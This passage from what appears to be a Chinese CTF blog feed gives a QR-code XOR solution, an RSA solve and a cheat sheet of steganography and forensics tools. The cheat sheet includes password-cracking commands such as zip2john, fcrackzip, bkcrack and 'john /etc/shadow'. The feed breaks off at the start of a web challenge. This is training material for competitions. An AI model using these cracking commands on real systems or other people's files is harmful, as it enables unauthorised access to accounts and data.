class="hljs-comment">#image.save(&#x27;1.png&#x27;)</span><br><br>white_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;white&#x27;</span>)<br>black_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;black&#x27;</span>)<br><br><span class="hljs-comment">#生成500*500的国际棋盘图</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): <span class="hljs-comment">#白色 奇数行奇数列 和 偶数行偶数列</span><br>            image.paste(white_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>): <span class="hljs-comment">#黑色 偶数行奇数列 和 奇数行偶数列</span><br>            image.paste(black_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br><span class="hljs-comment">#异或</span><br>img1 = cv2.imread(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>img2 = cv2.imread(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>xor_img = cv2.bitwise_xor(img1,img2)<br>cv2.imshow(<span class="hljs-string">&#x27;img&#x27;</span>,xor_img)<br>cv2.imwrite(<span class="hljs-string">&#x27;flag.png&#x27;</span>,xor_img)<br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/17002015428001.png" alt="img"></p><p>再看看别人队的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#1</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>n = <span class="hljs-number">49</span><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>width, height = img.size<br><br><span class="hljs-comment"># 0 -&gt; black</span><br>matrix = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  tmp = []<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    h = <span class="hljs-built_in">int</span>(i/<span class="hljs-number">49</span>*width+<span class="hljs-number">5</span>)<br>    w = <span class="hljs-built_in">int</span>(j/<span class="hljs-number">49</span>*height+<span class="hljs-number">5</span>)<br>    tmp += [<span class="hljs-built_in">int</span>(img.getpixel((w, h))[<span class="hljs-number">0</span>]/<span class="hljs-number">255</span>)]<br>  matrix += [tmp]<br><br>matrix2 = matrix.copy()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    matrix2[i][j] ^= (i+j) % <span class="hljs-number">2</span><br><br>img2 = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">490</span>, <span class="hljs-number">490</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    px = (matrix2[i][j]*<span class="hljs-number">255</span>,) * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>      <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        img2.putpixel((<span class="hljs-number">10</span>*i+p, <span class="hljs-number">10</span>*j+q), px)<br>img2.save(<span class="hljs-string">&#x27;qr.png&#x27;</span>)<br><br><span class="hljs-comment">#2</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>s=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>size=<span class="hljs-number">500</span><br>p=Image.new(<span class="hljs-string">&#x27;L&#x27;</span>,(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>))<br><span class="hljs-keyword">for</span> yy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>        a=<span class="hljs-number">0</span><br>        b=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> s.getpixel((<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*xx+<span class="hljs-number">5</span>),<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*yy+<span class="hljs-number">5</span>)))[<span class="hljs-number">2</span>]&gt;<span class="hljs-number">128</span> :<br>            a=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (xx+yy)%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>            b=<span class="hljs-number">1</span><br>        p.putpixel((xx,yy),(a^b)*<span class="hljs-number">255</span>)<br>p.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="一眼看出"><a href="#一眼看出" class="headerlink" title="一眼看出"></a>一眼看出</h2><p>p、q都相当于直接给了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span><br>r = getPrime(<span class="hljs-number">6</span>)<br>e = <span class="hljs-number">65537</span><br>a = <span class="hljs-number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><br>c = <span class="hljs-number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><br>p = gmpy2.next_prime(a - r)<br>q = gmpy2.next_prime(gmpy2.next_prime(a) + r)<br><br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi_n)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc工具使用</title>
    <link href="/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC工具使用"><a href="#MISC工具使用" class="headerlink" title="MISC工具使用"></a>MISC工具使用</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h3 id="PuzzleSolver"><a href="#PuzzleSolver" class="headerlink" title="PuzzleSolver"></a>PuzzleSolver</h3><p>byxs20师傅的工具，综合利用工具，包括盲水印、fix_png、</p><h3 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a><strong>stegsolve</strong></h3><p>常用的lsb隐写工具，图形化</p><h3 id="Ciphey"><a href="#Ciphey" class="headerlink" title="Ciphey"></a>Ciphey</h3><p>带ai的自动解密工具<br><a href="https://github.com/Ciphey/Ciphey">https://github.com/Ciphey/Ciphey</a><br><code>python3 -m pip install ciphey --upgrade</code></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ciphey -<span class="hljs-built_in">t</span> <span class="hljs-string">&quot;encode message&quot;</span><br></code></pre></td></tr></table></figure><h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><p>gap拼接图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">gaps --image=a.png --size=100 --save<br></code></pre></td></tr></table></figure><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><p>查看音频&#x2F;图片文件隐藏内容，jpg、png、wav</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">steghide extract -sf 1.jpg -p password<br></code></pre></td></tr></table></figure><h3 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h3><p>爆破steghide</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">stegseek 1.jpg<br></code></pre></td></tr></table></figure><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><p>拼接多个图片变成一个图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">montage *.jpg -tile 8X6 -geometry +0+0 1.jpg   <br></code></pre></td></tr></table></figure><h3 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a>Outguess</h3><p>outguess隐写，jpg，密码可以为空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">outguess -k <span class="hljs-string">&#x27;password&#x27;</span> -r 2.jpg -t 1.txt<br></code></pre></td></tr></table></figure><h3 id="QR-Research"><a href="#QR-Research" class="headerlink" title="QR_Research"></a>QR_Research</h3><p>二维码扫描工具，图形化界面，最高30%纠错率</p><h3 id="QrScan"><a href="#QrScan" class="headerlink" title="QrScan"></a>QrScan</h3><p>批量识别二维码</p><p><a href="https://github.com/zfb132/QrScan">https://github.com/zfb132/QrScan</a></p><h3 id="F5-steganography"><a href="#F5-steganography" class="headerlink" title="F5-steganography"></a>F5-steganography</h3><p>F5隐写，jpg、gif、bmp，密码可以为空 git clone <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">java Extract xx.jpg -p <span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Jphswin"><a href="#Jphswin" class="headerlink" title="Jphswin"></a><strong>Jphswin</strong></h3><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具，图形化</p><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a><strong>zsteg</strong></h3><p>基于Ruby编写的图片隐写分析工具，kali下使用比较方便</p><p><code>gem install zsteg</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#查看所有通道的隐写</span><br><span class="hljs-attribute">zsteg</span> <span class="hljs-number">1</span>.png --<span class="hljs-literal">all</span><br><span class="hljs-comment">#导出某一通道</span><br><span class="hljs-attribute">zsteg</span> -E extradata:<span class="hljs-number">0</span> green.png &gt; flag.zip<br></code></pre></td></tr></table></figure><h3 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h3><p>检测jpg隐写工具，有时候不太准 <a href="https://blog.csdn.net/qq_53079406/article/details/124596878">https://blog.csdn.net/qq_53079406/article/details/124596878</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">.\stegdetect.exe -tjopi -s 10.0 1.jpg<br></code></pre></td></tr></table></figure><h3 id="BlindWaterMark"><a href="#BlindWaterMark" class="headerlink" title="BlindWaterMark"></a><strong>BlindWaterMark</strong></h3><p>盲水印提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png<br></code></pre></td></tr></table></figure><h3 id="deepsound"><a href="#deepsound" class="headerlink" title="deepsound"></a>deepsound</h3><p>图形化音频隐写，将文件隐写进音频中</p><p><a href="https://github.com/oneplus-x/DeepSound-2.0">https://github.com/oneplus-x/DeepSound-2.0</a> <a href="http://jpinsoft.net/deepsound/download.aspx">http://jpinsoft.net/deepsound/download.aspx</a></p><h3 id="silenteye"><a href="#silenteye" class="headerlink" title="silenteye"></a><strong>silenteye</strong></h3><p>图形化图片&#x2F;音频隐写工具</p><p><a href="https://achorein.github.io/silenteye/download/?i2">https://achorein.github.io/silenteye/download/?i2</a></p><h3 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h3><p>图片信息查看工具</p><p><code>apt-get install exiftool</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exiftool</span> <span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>用法大全：<a href="https://www.rmnof.com/article/exiftool-introduction/">https://www.rmnof.com/article/exiftool-introduction/</a></p><h3 id="cloacked-pixel"><a href="#cloacked-pixel" class="headerlink" title="cloacked-pixel"></a>cloacked-pixel</h3><p>有密码的lsb隐写，集成在puzzlesolver</p><p>单独地址：<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 lsb.py extract 1.png 1.txt 123456<br></code></pre></td></tr></table></figure><h3 id="SNOW"><a href="#SNOW" class="headerlink" title="SNOW"></a>SNOW</h3><p>snow隐写（the Steganographic Nature Of Whitespace）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP">加密<br>SNOW.EXE -C -m <span class="hljs-string">&quot;message&quot;</span> -p <span class="hljs-string">&quot;passswd&quot;</span> infile outfile<br>解密<br>SNOW.EXE -C -p <span class="hljs-string">&quot;passwd&quot;</span> infile outfile<br></code></pre></td></tr></table></figure><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>图形化，音频隐写</p><h3 id="steganography"><a href="#steganography" class="headerlink" title="steganography"></a>steganography</h3><p>PixelJihad，png，可无密码</p><h3 id="wbStego4open"><a href="#wbStego4open" class="headerlink" title="wbStego4open"></a>wbStego4open</h3><p>图形化PDF、BMP、 TXT、 HTM隐写，要密码</p><h3 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h3><p>检查png的idat块</p><p><code>apt-get install pngcheck</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pngcheck</span> -v <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h3><p>linux下检查图片信息，主要用于识别gif的帧间隔时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">identify -format <span class="hljs-string">&quot;%s %T \n&quot;</span> 1.gif<br></code></pre></td></tr></table></figure><h3 id="npiet"><a href="#npiet" class="headerlink" title="npiet"></a>npiet</h3><p>用位图色块来编写程序，特征为图片的rgb很乱，多彩色部分，png、jpg、gif，无密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">npiet.exe -tpic <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="dtmf2num"><a href="#dtmf2num" class="headerlink" title="dtmf2num"></a>dtmf2num</h3><p>音频拨号隐写，wav</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">http://aluigi.altervista.org/mytoolz/dtmf2num.zip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">dtmf2num.exe 1.wav<br></code></pre></td></tr></table></figure><h3 id="MP3stego"><a href="#MP3stego" class="headerlink" title="MP3stego"></a>MP3stego</h3><p>音频隐写，mp3、aac</p><p><a href="https://www.petitcolas.net/steganography/mp3stego/">https://www.petitcolas.net/steganography/mp3stego/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">Decode.exe -X -P 123456 1.WAV<br></code></pre></td></tr></table></figure><h3 id="ntfsstreamseditor"><a href="#ntfsstreamseditor" class="headerlink" title="ntfsstreamseditor"></a>ntfsstreamseditor</h3><p>ntfs流隐写</p><h3 id="qsstv"><a href="#qsstv" class="headerlink" title="qsstv"></a>qsstv</h3><p>linux上的sstv接收软件，特点是可以直接读取wav音频文件里的信息，免去了外放的困扰</p><p><code>apt-get install qsstv</code></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h3><p>rar4&#x2F;zip等爆破密码</p><h3 id="AOPR"><a href="#AOPR" class="headerlink" title="AOPR"></a>AOPR</h3><p>office文档（word、excel、ppt）爆破</p><h3 id="APDFPR"><a href="#APDFPR" class="headerlink" title="APDFPR"></a>APDFPR</h3><p>pdf爆破</p><h3 id="zip2john"><a href="#zip2john" class="headerlink" title="zip2john"></a>zip2john</h3><p>配合john，zip文件爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，flag.txt为加密文件</span><br>zip2john 1.zip &gt; flag.txt<br><span class="hljs-comment">#此时flag.txt变为hash值</span><br>john flag.txt<br></code></pre></td></tr></table></figure><h3 id="john"><a href="#john" class="headerlink" title="john"></a>john</h3><p>爆破hash，kail下方便使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">john /etc/shadow --format=crypt<br></code></pre></td></tr></table></figure><h3 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h3><p>爆破zip&#x2F;rar&#x2F;7z，本地生成xml文件，可修改字典以及位数，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，20位线程数，type可选zip/rar/7z</span><br>rarcrack 1.zip --threads 20 --<span class="hljs-built_in">type</span> zip<br></code></pre></td></tr></table></figure><h3 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h3><p>爆破zip，可指定位数、模式等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，-l 1-10位数，-c1纯数字，-b暴力破解，-u 使用unzip删除错误</span><br>fcrackzip -v -b -u -l 1-10 -c1 1.zip <br></code></pre></td></tr></table></figure><h3 id="crc32爆破压缩包文件内容"><a href="#crc32爆破压缩包文件内容" class="headerlink" title="crc32爆破压缩包文件内容"></a>crc32爆破压缩包文件内容</h3><p>小于4字节<br>CRC32-Tools-1.1</p><p>大于4字节(5-6)<br>crc32.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python crc32.py reverse 0x....<br></code></pre></td></tr></table></figure><h3 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h3><p>明文爆破，需要已知12字节且其中至少8字节连续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-c 压缩包里加密的文件（或提取的密文数据）<br>-p 提取的明文部分<br>-x 压缩包内目标文件的偏移地址  部分已知明文值<br>-C 加密压缩包<br>-o offset  <br>-p 参数指定的明文在压缩包内目标文件的偏移量<br>-k 解出的密钥<br><br>bkcrack.exe -C encrypted.zip -c cipher -P plain.zip -p plain<br><br>bkcrack.exe -C encrypted.zip -c decipheredfile -k 12345678 23456789 34567890 -d decipheredfile<br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>最强的解码工具</p><p><a href="https://icyberchef.com/">https://icyberchef.com/</a></p><h3 id="Acropalypse-Multi-Tool"><a href="#Acropalypse-Multi-Tool" class="headerlink" title="Acropalypse-Multi-Tool"></a>Acropalypse-Multi-Tool</h3><p>windows截图剪贴板漏洞(aCropalypse) <a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python gui.py<br></code></pre></td></tr></table></figure><h3 id="Git-Extract"><a href="#Git-Extract" class="headerlink" title="Git_Extract"></a>Git_Extract</h3><p>本地.git恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python2 /home/ddd/桌面/Git_Extract-master/git_extract.py .git    <br></code></pre></td></tr></table></figure><h3 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig"></a>sysdig</h3><p>sysdig恢复scap为可读日志文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">sysdig -r charon.scap &gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><h3 id="Mouse-Recorder"><a href="#Mouse-Recorder" class="headerlink" title="Mouse Recorder"></a>Mouse Recorder</h3><p><code>.rsmr</code>文件，鼠标轨迹还原</p><p><a href="https://www.robot-soft.com/">https://www.robot-soft.com/</a></p><h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><p>分离视频音轨、帧</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffmpeg</span> -i flag.avi ./%<span class="hljs-number">4</span>d.png<br></code></pre></td></tr></table></figure><h3 id="crass"><a href="#crass" class="headerlink" title="crass"></a>crass</h3><p>xp3提取器</p><p><a href="https://github.com/chaceli/CTF_WP/blob/master/2018starctf/misc/xp3/wp/xp3%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E5%99%A8.7z">https://github.com/chaceli/CTF_WP/blob/master/2018starctf/misc/xp3/wp/xp3%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E5%99%A8.7z</a></p><h3 id="pcapfix"><a href="#pcapfix" class="headerlink" title="pcapfix"></a>pcapfix</h3><p>pcap文件修复</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://byxs20.github.io/">https://byxs20.github.io/</a></p><p><a href="https://cloud.tencent.com/developer/article/2069964">https://cloud.tencent.com/developer/article/2069964</a></p><p><a href="https://www.cnblogs.com/perfsky/p/17739016.html">https://www.cnblogs.com/perfsky/p/17739016.html</a></p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯</title>
    <link href="/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023鹏城杯"><a href="#2023鹏城杯" class="headerlink" title="2023鹏城杯"></a>2023鹏城杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 